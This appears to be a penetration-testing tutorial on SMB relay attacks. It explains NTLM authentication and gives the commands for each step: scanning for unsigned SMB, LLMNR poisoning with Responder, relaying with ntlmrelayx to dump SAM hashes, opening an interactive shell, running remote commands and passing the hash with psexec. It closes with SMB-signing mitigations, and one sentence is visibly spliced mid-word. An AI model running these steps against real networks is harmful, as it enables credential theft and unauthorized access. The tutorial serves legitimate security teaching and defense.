# SMB Relay Attacks

When cracking a victim’s password hash becomes impractical, such as in cases where companies enforce strong password policies like 21-character requirements or something, attackers can use **SMB relaying attacks** to bypass this obstacle and still gain unauthorized access.

### What is SMB?

**Server Message Block (SMB)** is a protocol used for network file sharing that enables devices within the same network to access shared resources like files and printers. It operates on the **Application and Presentation Layers** and typically uses **port 445**. SMB requires users to authenticate before accessing resources, and this authentication is often based on the **NTLM protocol** (usually NTLMv2).

#### How NTLM Authentication Works

**NTLM (NT LAN Manager)** is a challenge-response authentication protocol used in Windows. Here's how it works:

1. When a client requests access to a service, the service sends a random challenge (nonce).
2. The client encrypts this challenge using its password hash and sends it back.
3. The service forwards the encrypted challenge and the clear-text challenge to the **Domain Controller (DC)**.
4. The DC, which stores all user and resource hashes, encrypts the challenge with the user’s hash.
5. If the encrypted challenge matches the one sent by the client, access is granted.onnecting to their malicious system instead of the intended server.

#### **The Attack Process (SMB Relaying)**

The attacker doesn't crack the password. Instead, they just "relay" the challenge and response between the victim and another server. Here's how:

1. **Intercept Connection**:\
   The attacker tricks the victim's device into connecting to them instead of the real server. This could be done by:
   * Responding to broadcast requests (e.g., LLMNR poisoning).
   * Spoofing a network resource.
2. **Get the Challenge**:\
   The attacker forwards the victim’s login request to a target server.\
   The target server sends its challenge back (just like normal).
3. **Relay the Challenge**:\
   The attacker forwards this challenge to the victim. The victim, believing it is from the real server, encrypts it with their password hash and sends the response.
4. **Authenticate as the Victim**:\
   The attacker sends the victim’s response to the target server.\
   Since the response matches the challenge, the target server thinks the victim has logged in.

For this attack to work, the following conditions must be met:

1. **Same Network**
2. **LLMNR Enabled**
3. **SMB Signing Disabled/Not Required**
4. **Elevated  User ( root - admin ) Hash**

#### Exploiting SMB (AKA SMB Relay Attacks)

#### Step 1: The Attacker Identifies Workstations without SMB Signing Enforced

```bash
nmap --script=smb2-security-mode.nse -p445 10.10.10.0/24
```

<figure><img src="/files/ll1YPMCEdia02pJQUdGH" alt=""><figcaption></figcaption></figure>

&#x20;**"Message signing enabled but not required."**

**Message signing** used to add a digital signature to every SMB message to prevent tampering and verify the sender. Without it enforced, attackers can exploit SMB relaying attacks. By default, Windows enables it but doesn't require it, leaving systems vulnerable.

#### Step 2: The Attacker Sets Up Their Attack

First, we need to configure [Responder](https://github.com/SpiderLabs/Responder) and [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) fto avoid responding to [SMB and HTTP](#user-content-fn-1)[^1] directly, so it can relay those requests to **ntlmrelayx**.

```bash
sudo nano  /etc/responder/Responder.conf
```

<figure><img src="https://tcm-sec.com/wp-content/uploads/2023/09/smb-2.png" alt=""><figcaption><p>nsure that <code>SMB</code> and <code>HTTP</code> responses are set to off</p></figcaption></figure>

Next, launch Responder.

```bash
sudo responder –I eth0 -dwP
```

<figure><img src="https://tcm-sec.com/wp-content/uploads/2023/09/smb-3.png" alt=""><figcaption></figcaption></figure>

Finally, launch ntlmrelayx and wait for an event to occur.

```bash
sudo ntlmrelayx.py –tf targets.txt –smb2support
```

<figure><img src="https://tcm-sec.com/wp-content/uploads/2023/09/smb-4.png" alt=""><figcaption></figcaption></figure>

Step 3: An Event Occurs and Credentials Get Relayed

Behind the scenes, an event (such as LLMNR poisoning) has occurred. Responder will capture this event, pass it to ntlmrelayx, which will relay the credentials to the targets in our targets file.

Below is what a successful relay looks like.

<figure><img src="https://tcm-sec.com/wp-content/uploads/2023/09/smb-5.png" alt=""><figcaption></figcaption></figure>

As you can see here, the local **SAM hashes** (the password hashes from the victim machine) dumped to the terminal. You can either **crack these hashes** offline or, more effectively, use **pass-the-hash** attacks to gain access to the victim machine without needing to know the actual password.

the beauty of relay attacks is that you do not need to ever know the password to pull off the attack. So much for a good password policy!

#### Gain Shell Access or Run Commands

While gaining a shell on the target is not always necessary for a successful SMB relay attack, it can be a valuable option to have in certain scenarios, especially when further manual actions are required in the target environment.

With **ntlmrelayx**, you can also attempt to gain shell access or run arbitrary commands on the victim machine.

```bash
sudo ntlmrelayx.py –tf targets.txt –smb2support -i
```

<figure><img src="https://tcm-sec.com/wp-content/uploads/2023/09/smb-6.png" alt=""><figcaption></figcaption></figure>

```bash
nc 127.0.0.1 11000
```

<figure><img src="https://tcm-sec.com/wp-content/uploads/2023/09/smb-7.png" alt=""><figcaption></figcaption></figure>

We can also run commands remotely. To run a command (e.g., `whoami`) on the victim machine during the attack:

```bash
sudo ntlmrelayx –tf targets.txt –smb2support –c “whoami”
```

<figure><img src="https://tcm-sec.com/wp-content/uploads/2023/09/smb-8.png" alt=""><figcaption></figcaption></figure>

While tools like `Metasploit` can be used for post-exploitation tasks, they are sometimes detected by security systems. An effective alternative is  [psexec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py), which can also leverage the victim’s hash to execute commands. For example:

```bash
psexec.py administrator@10.0.0.25 -hashes <hash>
```

#### there also a  few other tool like [wmiexec.py](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py) and [smbexec](https://github.com/fortra/impacket/blob/master/examples/smbexec.py) depends on the target’s environment and security measures.&#x20;

#### How Can SMB Relay Attacks Be Mitigated?

**Main Defense: Enable SMB Signing**

* **Pros**: Completely stops SMB relay attacks.
* **Cons**: May cause performance issues, especially with SMBv1 and legacy devices.

To configure Active Directory to enforce SMB signing, **enable the following policies** in Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options:

* **Client-side**:
  * Microsoft network client: Digitally sign communications (always)
  * Microsoft network client: Digitally sign communications (if server agrees)
* **Server-side**:
  * Microsoft network server: Digitally sign communications (always)
  * Microsoft network server: Digitally sign communications (if client agrees)

**Confirming the Mitigation**\
Run this command to verify SMB signing is enabled:

```powershell
reg query HKLM\System\CurrentControlSet\Services\LanManServer\Parameters | findstr /I securitysignature
```

If the result shows ‘0x1’, SMB signing is active.

**Alternate Defenses**

* **Account tiering**: Separate admin accounts (e.g., “bob” and “bob-da”) to limit access based on task needs.
* **Local admin restrictions**: Limit local admin access to reduce the effectiveness of relay attacks.

[^1]: By default, Responder can respond to various protocols, but if SMB and HTTP responses are enabled, it might unintentionally authenticate victims to the attacker's machine instead of relaying the requests to the intended target. Disabling these responses ensures that only **NTLM hashes** are captured and properly relayed through **ntlmrelayx**, allowing the attacker to forward the authentication data to the target system for successful exploitation.
